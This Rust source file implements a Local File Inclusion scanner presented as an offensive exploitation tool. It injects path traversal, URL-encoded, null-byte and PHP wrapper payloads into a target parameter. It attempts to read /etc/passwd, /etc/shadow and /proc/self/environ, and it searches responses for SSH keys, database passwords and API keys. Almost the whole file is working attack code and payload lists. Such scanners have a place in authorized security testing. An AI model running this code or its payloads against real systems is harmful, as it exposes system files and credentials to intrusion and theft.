// ----------------------------------------------------------------------------
//  lfi_scanner.rs — Local File Inclusion scanner
// ----------------------------------------------------------------------------
//  Detects Local File Inclusion (LFI) vulnerabilities by attempting to read
//  sensitive files (/etc/passwd, /proc/version) through parameter injection.
//  Uses path traversal, null byte injection, encoding bypasses, and PHP wrapper
//  techniques (php://filter) with strict content-based confirmation.
//
//  --- Developers ---------------------------------------------------------------
//  khaninkali             — разработчик / core engineer (Rust backend, logic)
//  Lyara Koroleva         — дизайнер / blazing fast CLI & interface design
//  HsecDevelopers         — 测试 / テスト / testing & QA (integration, validation)
//  projectk 2091         — HyperSecurityOffensiveLabs lineage
// ----------------------------------------------------------------------------

//
//
// ---------------------------------------------------------------------------
//  ⚠ WARNING / 警告 / 警告
// ---------------------------------------------------------------------------
//  This source code is the exclusive property of HyperSecurityOffensiveLabs.
//  You are permitted to VIEW this code for educational and reference
//  purposes only. You may NOT modify, distribute, sublicense, or create
//  derivative works without explicit written permission from khaninkali
//  and the HyperSecurityOffensiveLabs development team.
//
//  このソースコードはHyperSecurityOffensiveLabsの独占的知的財産です。
//  教育目的および参照目的での閲覧のみ許可されています。
//  khaninkaliおよびHyperSecurityOffensiveLabs開発チームの
//  書面による明示的な許可なく、修正、配布、サブライセンス、
//  または二次的著作物の作成を禁止します。
//
//  本源代码是HyperSecurityOffensiveLabs的独家财产。
//  仅允许出于教育和参考目的查看。未经khaninkali和
//  HyperSecurityOffensiveLabs开发团队的书面明确许可，
//  禁止修改、分发、再许可或创建衍生作品。
// ---------------------------------------------------------------------------
//
//

use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::detection::analyzer::Finding;
use crate::payload::lfi::Lfi;
use crate::utils::url::UrlUtil;
use anyhow::Result;
use std::sync::Arc;

// ◆ LFI電脳検出戦略 / LFI detection techniques:
//   ① Basic direct:   /etc/passwd, /proc/version, /etc/shadow (6 sensitive files)
//   ② Path traversal: ../../../etc/passwd (depth 3-5, strict content validation)
//   ③ Encoding bypass: %2e%2e%2f, %252e%252e%252f (double-encoded)
//   ④ Null byte:      ../../../etc/passwd%00 (PHP < 5.3.4)
//   ⑤ Filter bypass:  /etc/./passwd, /etc//passwd (path normalization tricks)
//   ⑥ PHP wrappers:    php://filter/read=convert.base64-encode/resource=...
//   ◆ Detection: requires structural content indicators (NOT just keywords):
//     ★ /etc/passwd  → "root:x:0:0" + UID/GID parsable as u32
//     ★ /etc/hosts   → 2+ lines starting with IP and containing "localhost"
//     ★ /proc/version → "linux version" + "gcc version" + "#" + 3+ dots
//     ★ SSH keys     → line starts with "ssh-rsa" or "ssh-ed25519"
//     ★ PEM certs    → line starts with "-----BEGIN" (20+ chars)
/// Local File Inclusion (LFI) scanner with real URL-based exploitation
pub struct LFIScanner {
    client: Arc<HttpClient>,
    findings: Vec<Finding>,
    exploitation_level: u8,
}

#[derive(Debug, Clone)]
pub struct LFIResult {
    pub technique: String,
    pub success: bool,
    pub payload: String,
    pub response: String,
    pub file_read: bool,
    pub file_content: String,
    pub bypass_method: String,
}

#[derive(Debug, Clone)]
pub struct LFISession {
    pub target_url: String,
    pub vulnerable_parameter: String,
    pub successful_techniques: Vec<String>,
    pub read_files: Vec<String>,
    pub bypass_methods: Vec<String>,
    pub sensitive_data: Vec<String>,
}

impl LFIScanner {
    pub fn new(client: Arc<HttpClient>, exploitation_level: u8) -> Self {
        Self {
            client,
            findings: Vec::new(),
            exploitation_level: exploitation_level.min(100),
        }
    }

    /// Perform comprehensive LFI exploitation
    pub async fn exploit_lfi(&mut self, target_url: &str, parameter: &str) -> Result<Vec<LFIResult>, Box<dyn std::error::Error + Send + Sync>> {
        println!("[*] Starting LFI exploitation at level {}", self.exploitation_level);
        let mut results = Vec::new();

        // Test basic LFI
        let basic_result = self.test_basic_lfi(target_url, parameter).await?;
        results.push(basic_result);

        // Test path traversal
        let path_result = self.test_path_traversal(target_url, parameter).await?;
        results.push(path_result);

        // Test encoding bypasses
        let encoding_result = self.test_encoding_bypasses(target_url, parameter).await?;
        results.push(encoding_result);

        // Test null byte injection
        let null_byte_result = self.test_null_byte_injection(target_url, parameter).await?;
        results.push(null_byte_result);

        // Test filter bypasses
        let filter_result = self.test_filter_bypasses(target_url, parameter).await?;
        results.push(filter_result);

        // Test wrapper bypasses
        let wrapper_result = self.test_wrapper_bypasses(target_url, parameter).await?;
        results.push(wrapper_result);

        Ok(results)
    }

    /// Test basic LFI techniques with reduced false positives
    async fn test_basic_lfi(&mut self, target_url: &str, parameter: &str) -> Result<LFIResult, Box<dyn std::error::Error + Send + Sync>> {
        let mut sensitive_files: Vec<String> = vec![
            "/etc/passwd".into(),
            "/etc/shadow".into(),
            "/etc/hosts".into(),
            "/proc/version".into(),
            "/proc/self/environ".into(),
            "/proc/self/cmdline".into(),
        ];
        sensitive_files.extend(Lfi::get_linux_files());

        // Get baseline first
        let baseline_req = HttpRequest::get(&UrlUtil::inject_param(target_url, parameter, "baseline_oxide_test"));
        let baseline = match self.client.send(baseline_req).await {
            Ok(resp) => resp.body,
            Err(_) => String::new(),
        };

        for file in sensitive_files {
            let payload = file.to_string();
            let test_url = UrlUtil::inject_param(target_url, parameter, &urlencoding::encode(&payload));
            let request = HttpRequest::get(&test_url);

            let response = self.client.send(request).await?;
            let response_text = response.body;

            // Skip if same as baseline
            if response_text == baseline {
                continue;
            }

            // Check if file was successfully read with STRICT validation
            if self.contains_lfi_indicators(&response_text) {
                // Store finding for this successful LFI
                self.findings.push(
                    crate::detection::analyzer::Finding::new(
                        target_url,
                        crate::detection::analyzer::Severity::Critical,
                        &format!("LFI vulnerability in parameter '{}'", parameter),
                        &format!("Successfully read file using payload: {}", payload)
                    )
                );
                
                return Ok(LFIResult {
                    technique: "basic_lfi".to_string(),
                    success: true,
                    payload,
                    response: response_text.clone(),
                    file_read: true,
                    file_content: response_text,
                    bypass_method: "direct".to_string(),
                });
            }
        }

        Ok(LFIResult {
            technique: "basic_lfi".to_string(),
            success: false,
            payload: String::new(),
            response: String::new(),
            file_read: false,
            file_content: String::new(),
            bypass_method: "direct".to_string(),
        })
    }

    /// Check for LFI indicators with strict validation
    fn contains_lfi_indicators(&self, response_text: &str) -> bool {
        let lower_response = response_text.to_lowercase();
        
        // Strong indicator: passwd file structure with proper format
        if lower_response.contains("root:x:0:0") && lower_response.contains("/bin/") {
            // Check for actual passwd file structure
            let lines: Vec<&str> = lower_response.lines().collect();
            for line in &lines {
                let parts: Vec<&str> = line.split(':').collect();
                if parts.len() >= 6 {
                    // Check if it looks like a passwd entry (username:password:uid:gid:gecos:home:shell)
                    if parts[2].parse::<u32>().is_ok() && parts[3].parse::<u32>().is_ok() {
                        return true;
                    }
                }
            }
        }
        
        // hosts file structure — must have IP and hostname on the SAME line
        if lower_response.contains("127.0.0.1") && lower_response.contains("localhost") {
            let lines: Vec<&str> = lower_response.lines().collect();
            let ip_lines = lines.iter().filter(|line| {
                let trimmed = line.trim();
                // Must start with IP at beginning of line (not just any mention)
                (trimmed.starts_with("127.") || trimmed.starts_with("192.") || trimmed.starts_with("10.") || trimmed.starts_with("::1"))
                    && trimmed.split_whitespace().any(|w| w.contains("localhost"))
            }).count();
            if ip_lines >= 2 {
                return true;
            }
        }
        
        // proc/version has specific format with kernel version number
        if lower_response.contains("linux version") && lower_response.contains("gcc version") && lower_response.contains('#') {
            // Require kernel version format like "5.10.0" or "4.15.0"
            if lower_response.chars().filter(|&c| c == '.').count() >= 3 {
                return true;
            }
        }
        
        // SSH keys require full line starting with the key type
        if lower_response.lines().any(|l| {
            let t = l.trim();
            t.starts_with("ssh-rsa") || t.starts_with("ssh-ed25519") || t.starts_with("ecdsa-sha2-")
        }) {
            return true;
        }
        
        // PEM certificates require proper header at start of line
        if lower_response.lines().any(|l| {
            let t = l.trim().to_uppercase();
            (t.starts_with("-----BEGIN") || t.starts_with("-----END")) && t.len() >= 20
        }) {
            return true;
        }
        
        false
    }

    /// Test path traversal techniques with reduced false positives
    async fn test_path_traversal(&self, target_url: &str, parameter: &str) -> Result<LFIResult, Box<dyn std::error::Error + Send + Sync>> {
        let path_payloads = vec![
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
        ];

        // Get baseline first
        let baseline_req = HttpRequest::get(&UrlUtil::inject_param(target_url, parameter, "baseline_oxide_test"));
        let baseline = match self.client.send(baseline_req).await {
            Ok(resp) => resp.body,
            Err(_) => String::new(),
        };

        for payload in path_payloads {
            let test_url = UrlUtil::inject_param(target_url, parameter, &urlencoding::encode(payload));
            let request = HttpRequest::get(&test_url);

            let response = self.client.send(request).await?;
            let response_text = response.body;

            // Skip if same as baseline
            if response_text == baseline {
                continue;
            }

            // Use strict indicator check
            if self.contains_lfi_indicators(&response_text) {
                return Ok(LFIResult {
                    technique: "path_traversal".to_string(),
                    success: true,
                    payload: payload.to_string(),
                    response: response_text.clone(),
                    file_read: true,
                    file_content: response_text,
                    bypass_method: "path_traversal".to_string(),
                });
            }
        }

        Ok(LFIResult {
            technique: "path_traversal".to_string(),
            success: false,
            payload: String::new(),
            response: String::new(),
            file_read: false,
            file_content: String::new(),
            bypass_method: "path_traversal".to_string(),
        })
    }

    /// Test encoding bypass techniques with reduced false positives
    async fn test_encoding_bypasses(&self, target_url: &str, parameter: &str) -> Result<LFIResult, Box<dyn std::error::Error + Send + Sync>> {
        let encoding_payloads = vec![
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        ];

        // Get baseline
        let baseline_req = HttpRequest::get(&UrlUtil::inject_param(target_url, parameter, "baseline_oxide_test"));
        let baseline = match self.client.send(baseline_req).await {
            Ok(resp) => resp.body,
            Err(_) => String::new(),
        };

        for payload in encoding_payloads {
            let test_url = UrlUtil::inject_param(target_url, parameter, payload);
            let request = HttpRequest::get(&test_url);

            let response = self.client.send(request).await?;
            let response_text = response.body;

            if response_text != baseline && self.contains_lfi_indicators(&response_text) {
                return Ok(LFIResult {
                    technique: "encoding_bypass".to_string(),
                    success: true,
                    payload: payload.to_string(),
                    response: response_text.clone(),
                    file_read: true,
                    file_content: response_text,
                    bypass_method: "encoding".to_string(),
                });
            }
        }

        Ok(LFIResult {
            technique: "encoding_bypass".to_string(),
            success: false,
            payload: String::new(),
            response: String::new(),
            file_read: false,
            file_content: String::new(),
            bypass_method: "encoding".to_string(),
        })
    }

    /// Test null byte injection with reduced false positives
    async fn test_null_byte_injection(&self, target_url: &str, parameter: &str) -> Result<LFIResult, Box<dyn std::error::Error + Send + Sync>> {
        let null_byte_payloads = vec![
            "../../../etc/passwd%00",
            "../../../../etc/passwd%00",
        ];

        // Get baseline
        let baseline_req = HttpRequest::get(&UrlUtil::inject_param(target_url, parameter, "baseline_oxide_test"));
        let baseline = match self.client.send(baseline_req).await {
            Ok(resp) => resp.body,
            Err(_) => String::new(),
        };

        for payload in null_byte_payloads {
            let test_url = UrlUtil::inject_param(target_url, parameter, &urlencoding::encode(payload));
            let request = HttpRequest::get(&test_url);

            let response = self.client.send(request).await?;
            let response_text = response.body;

            if response_text != baseline && self.contains_lfi_indicators(&response_text) {
                return Ok(LFIResult {
                    technique: "null_byte_injection".to_string(),
                    success: true,
                    payload: payload.to_string(),
                    response: response_text.clone(),
                    file_read: true,
                    file_content: response_text,
                    bypass_method: "null_byte".to_string(),
                });
            }
        }

        Ok(LFIResult {
            technique: "null_byte_injection".to_string(),
            success: false,
            payload: String::new(),
            response: String::new(),
            file_read: false,
            file_content: String::new(),
            bypass_method: "null_byte".to_string(),
        })
    }

    /// Test filter bypass techniques with reduced false positives
    async fn test_filter_bypasses(&self, target_url: &str, parameter: &str) -> Result<LFIResult, Box<dyn std::error::Error + Send + Sync>> {
        let filter_payloads = vec![
            "/etc/passwd",
            "/etc//passwd",
            "/etc/./passwd",
        ];

        // Get baseline
        let baseline_req = HttpRequest::get(&UrlUtil::inject_param(target_url, parameter, "baseline_oxide_test"));
        let baseline = match self.client.send(baseline_req).await {
            Ok(resp) => resp.body,
            Err(_) => String::new(),
        };

        for payload in filter_payloads {
            let test_url = UrlUtil::inject_param(target_url, parameter, &urlencoding::encode(payload));
            let request = HttpRequest::get(&test_url);

            let response = self.client.send(request).await?;
            let response_text = response.body;

            if response_text != baseline && self.contains_lfi_indicators(&response_text) {
                return Ok(LFIResult {
                    technique: "filter_bypass".to_string(),
                    success: true,
                    payload: payload.to_string(),
                    response: response_text.clone(),
                    file_read: true,
                    file_content: response_text,
                    bypass_method: "filter".to_string(),
                });
            }
        }

        Ok(LFIResult {
            technique: "filter_bypass".to_string(),
            success: false,
            payload: String::new(),
            response: String::new(),
            file_read: false,
            file_content: String::new(),
            bypass_method: "filter".to_string(),
        })
    }

    /// Test wrapper bypass techniques with reduced false positives
    async fn test_wrapper_bypasses(&self, target_url: &str, parameter: &str) -> Result<LFIResult, Box<dyn std::error::Error + Send + Sync>> {
        let wrapper_payloads = vec![
            "php://filter/read=convert.base64-encode/resource=/etc/passwd",
            "file:///etc/passwd",
        ];

        // Get baseline
        let baseline_req = HttpRequest::get(&UrlUtil::inject_param(target_url, parameter, "baseline_oxide_test"));
        let baseline = match self.client.send(baseline_req).await {
            Ok(resp) => resp.body,
            Err(_) => String::new(),
        };

        for payload in wrapper_payloads {
            let test_url = UrlUtil::inject_param(target_url, parameter, &urlencoding::encode(payload));
            let request = HttpRequest::get(&test_url);

            let response = self.client.send(request).await?;
            let response_text = response.body;

            // Strict validation - must be different from baseline AND contain LFI indicators
            if response_text != baseline && self.contains_lfi_indicators(&response_text) {
                return Ok(LFIResult {
                    technique: "wrapper_bypass".to_string(),
                    success: true,
                    payload: payload.to_string(),
                    response: response_text.clone(),
                    file_read: true,
                    file_content: response_text,
                    bypass_method: "wrapper".to_string(),
                });
            }
        }

        Ok(LFIResult {
            technique: "wrapper_bypass".to_string(),
            success: false,
            payload: String::new(),
            response: String::new(),
            file_read: false,
            file_content: String::new(),
            bypass_method: "wrapper".to_string(),
        })
    }

    /// Start comprehensive LFI session
    pub async fn start_lfi_session(&mut self, target_url: &str, parameter: &str) -> Result<LFISession, Box<dyn std::error::Error + Send + Sync>> {
        let results = self.exploit_lfi(target_url, parameter).await?;
        
        let mut successful_techniques = Vec::new();
        let mut read_files = Vec::new();
        let mut bypass_methods = Vec::new();
        let mut sensitive_data = Vec::new();

        for result in results {
            if result.success {
                successful_techniques.push(result.technique.clone());
                bypass_methods.push(result.bypass_method.clone());
                
                if result.file_read {
                    read_files.push(result.payload.clone());
                    
                    // Extract sensitive data from file content
                    if result.file_content.contains("root:x:0:0") {
                        sensitive_data.push("root_user".to_string());
                    }
                    if result.file_content.contains("daemon:") {
                        sensitive_data.push("daemon_user".to_string());
                    }
                    if result.file_content.contains("127.0.0.1") {
                        sensitive_data.push("localhost_config".to_string());
                    }
                    if (result.file_content.contains("Apache") || result.file_content.contains("nginx")) &&
                       (result.file_content.contains("ServerRoot") || result.file_content.contains("DocumentRoot") || result.file_content.contains("httpd.conf")) {
                        sensitive_data.push("web_server_config".to_string());
                    }
                    if regex::Regex::new(r"(?i)\bmysql\b").unwrap().is_match(&result.file_content) &&
                       (result.file_content.contains("DB_HOST") || result.file_content.contains("DB_NAME") || result.file_content.contains("database") || result.file_content.contains("host =")) {
                        sensitive_data.push("database_config".to_string());
                    }
                    if result.file_content.contains("BEGIN SSH") || result.file_content.contains("ssh-rsa") || result.file_content.contains("ssh-ed25519") || result.file_content.contains("id_rsa") || result.file_content.contains("id_ed25519") {
                        sensitive_data.push("ssh_config".to_string());
                    }
                }
            }
        }

        Ok(LFISession {
            target_url: target_url.to_string(),
            vulnerable_parameter: parameter.to_string(),
            successful_techniques,
            read_files,
            bypass_methods,
            sensitive_data,
        })
    }

    /// Generate LFI payload
    pub fn generate_lfi_payload(&self, file_path: &str, bypass_method: &str) -> String {
        match bypass_method {
            "basic" => file_path.to_string(),
            "path_traversal" => format!("../../../{}", file_path),
            "encoding" => format!("%2e%2e%2f%2e%2e%2f%2e%2e%2f{}", file_path.replace("/", "%2f")),
            "null_byte" => format!("../../../{}%00", file_path),
            "filter" => format!("/etc/../{}", file_path),
            "wrapper" => format!("php://filter/read=convert.base64-encode/resource={}", file_path),
            _ => file_path.to_string(),
        }
    }

    /// Test custom LFI payload — success is determined by content indicators,
    /// not HTTP status code (a 200 with no file content is not a successful LFI).
    pub async fn test_custom_payload(&self, target_url: &str, parameter: &str, payload: &str) -> Result<LFIResult, Box<dyn std::error::Error + Send + Sync>> {
        let test_url = UrlUtil::inject_param(target_url, parameter, &urlencoding::encode(payload));
        let request = HttpRequest::get(&test_url);

        let response = self.client.send(request).await?;
        let response_text = response.body;
        let file_read = self.contains_lfi_indicators(&response_text);

        Ok(LFIResult {
            technique: "custom_payload".to_string(),
            success: file_read,
            payload: payload.to_string(),
            response: response_text.clone(),
            file_read,
            file_content: if file_read { response_text } else { String::new() },
            bypass_method: "custom".to_string(),
        })
    }

    /// Analyze LFI effectiveness
    pub fn analyze_lfi_effectiveness(&self, results: &[LFIResult]) -> f32 {
        if results.is_empty() {
            return 0.0;
        }

        let success_count = results.iter().filter(|r| r.success).count();
        let file_read_count = results.iter().filter(|r| r.file_read).count();

        let base_score = (success_count as f32 / results.len() as f32) * 100.0;
        let bonus_score = (file_read_count as f32 / results.len() as f32) * 50.0;

        (base_score + bonus_score).min(100.0)
    }

    /// Get most successful LFI technique
    pub fn get_best_technique(&self, results: &[LFIResult]) -> Option<String> {
        results
            .iter()
            .filter(|r| r.success)
            .max_by(|a, b| {
                let score_a = a.file_read as u8 * 2;
                let score_b = b.file_read as u8 * 2;
                score_a.cmp(&score_b)
            })
            .map(|r| r.technique.clone())
    }

    /// Extract sensitive information from file content
    /// Uses strict contextual checks to avoid generic word matches.
    pub fn extract_sensitive_info(&self, file_content: &str) -> Vec<String> {
        let mut sensitive_info = Vec::new();

        // Only flag if file has actual passwd entry structure
        if file_content.contains("root:x:0:0") && file_content.contains("/bin/") {
            sensitive_info.push("root_user_found".to_string());
        }
        // Database credentials require specific patterns, not just the word "password"
        if file_content.contains("DB_PASSWORD") || file_content.contains("db_password")
            || file_content.contains("mysql_native_password") || file_content.contains("password_hash")
        {
            sensitive_info.push("database_credentials".to_string());
        }
        // Web server config requires actual config directives
        if (file_content.contains("ServerRoot") || file_content.contains("DocumentRoot"))
            || (file_content.contains("worker_processes") || file_content.contains("server_name"))
        {
            sensitive_info.push("web_server_config".to_string());
        }
        // SSH config requires actual key content, not just the word "ssh"
        if file_content.contains("-----BEGIN") || file_content.contains("ssh-rsa AAAA")
            || file_content.contains("ssh-ed25519 AAAA")
        {
            sensitive_info.push("ssh_private_key".to_string());
        }
        // API keys require looking like keys, not just the word "api"
        if file_content.contains("api_key=") || file_content.contains("API_KEY=")
            || file_content.contains("secret_key=") || file_content.contains("SECRET_KEY=")
        {
            sensitive_info.push("api_credentials".to_string());
        }

        sensitive_info
    }
}
